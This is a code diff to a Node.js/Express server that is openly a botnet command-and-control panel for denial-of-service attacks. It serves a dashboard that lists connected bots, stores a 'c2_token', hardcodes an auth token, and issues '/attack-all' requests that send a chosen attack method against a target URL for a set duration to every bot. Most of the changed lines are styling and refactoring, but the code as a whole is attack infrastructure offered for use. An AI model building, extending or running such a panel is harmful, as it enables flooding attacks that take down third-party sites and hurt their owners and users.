@@ -10,14 +10,13 @@ app.use(express.json());
 const port = process.env.PORT || 5553;
 const AUTH_TOKEN = "ricardo";
 
-// Trust proxy – fixes X-Forwarded-For warning on Render
 app.set('trust proxy', 1);
 
-// Rate limiting
+// Rate limiting (skip UI and ping)
 const limiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 1000,
-  skip: (req) => req.path === '/ping' || req.path === '/',
+  skip: (req) => req.path === '/' || req.path === '/ping' || req.path === '/dashboard',
   keyGenerator: (req) => req.ip || req.connection.remoteAddress || 'unknown'
 });
 app.use('/api/', limiter);
@@ -201,7 +200,7 @@ app.post('/api/report', authenticate, (req, res) => {
   res.json({ success: true });
 });
 
-// ========== CONTROL ENDPOINTS (for UI) ==========
+// ========== API ENDPOINTS (for UI) ==========
 app.get('/bots', authenticate, (req, res) => {
   const now = Date.now();
   const botsWithStatus = connectedBots.map(bot => ({
@@ -376,11 +375,11 @@ app.get('/health', (req, res) => {
 });
 
 // ========== WEB UI ==========
-// Serve the main dashboard
+// Serve the dashboard on the root path
 app.get('/', (req, res) => {
   res.send(`
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -403,10 +402,12 @@ app.get('/', (req, res) => {
       border-radius: 12px;
       border: 1px solid #30363d;
       margin-bottom: 20px;
+      flex-wrap: wrap;
+      gap: 10px;
     }
     .header h1 { font-size: 24px; color: #58a6ff; }
-    .header .status { font-size: 14px; color: #8b949e; }
-    .header .status span { color: #2ea043; font-weight: bold; }
+    .status { font-size: 14px; color: #8b949e; }
+    .status span { color: #2ea043; font-weight: bold; }
     .login-box {
       display: flex;
       gap: 10px;
@@ -472,8 +473,10 @@ app.get('/', (req, res) => {
       padding: 8px 12px;
       border-bottom: 1px solid #21262d;
       font-size: 14px;
+      flex-wrap: wrap;
+      gap: 5px;
     }
-    .bot-item .id { color: #58a6ff; font-family: monospace; }
+    .bot-item .id { color: #58a6ff; font-family: monospace; font-size: 12px; }
     .bot-item .status { font-weight: bold; }
     .bot-item .status.online { color: #2ea043; }
     .bot-item .status.offline { color: #f85149; }
@@ -533,7 +536,7 @@ app.get('/', (req, res) => {
     }
     @media (max-width: 768px) {
       .grid { grid-template-columns: 1fr; }
-      .header { flex-direction: column; gap: 10px; align-items: stretch; }
+      .header { flex-direction: column; align-items: stretch; }
       .login-box { justify-content: center; }
     }
   </style>
@@ -609,7 +612,7 @@ app.get('/', (req, res) => {
 
 <script>
   let token = localStorage.getItem('c2_token') || 'ricardo';
-  if (token) document.getElementById('tokenInput').value = token;
+  document.getElementById('tokenInput').value = token;
 
   function login() {
     token = document.getElementById('tokenInput').value;
@@ -618,9 +621,8 @@ app.get('/', (req, res) => {
   }
 
   async function apiCall(endpoint, options = {}) {
-    const url = endpoint.startsWith('http') ? endpoint : endpoint;
     const headers = { 'Authorization': token, ...options.headers };
-    const res = await fetch(url, { ...options, headers });
+    const res = await fetch(endpoint, { ...options, headers });
     if (res.status === 401) {
       alert('Unauthorized – please check your token.');
       return null;
@@ -680,7 +682,7 @@ app.get('/', (req, res) => {
     if (!target) { alert('Please enter a target URL.'); return; }
     log(`🚀 Sending attack-all: ${method} -> ${target} for ${time}s`);
     try {
-      const result = await apiCall(`/attack-all?target=${encodeURIComponent(target)}&time=${time}&methods=${method}`);
+      const result = await apiCall(\`/attack-all?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
       if (result && result.success) {
         log(`✅ Attack sent to ${result.sent}/${result.total} bots`);
         if (result.failed && result.failed.length) {
@@ -732,6 +734,7 @@ app.listen(port, () => {
   console.log(`📍 Port: ${port}`);
   console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
   console.log(`🌐 Open in browser: http://localhost:${port}`);
+  console.log('   (or your Render URL)');
   console.log('========================================\n');
 
   if (!fs.existsSync('./methods')) {
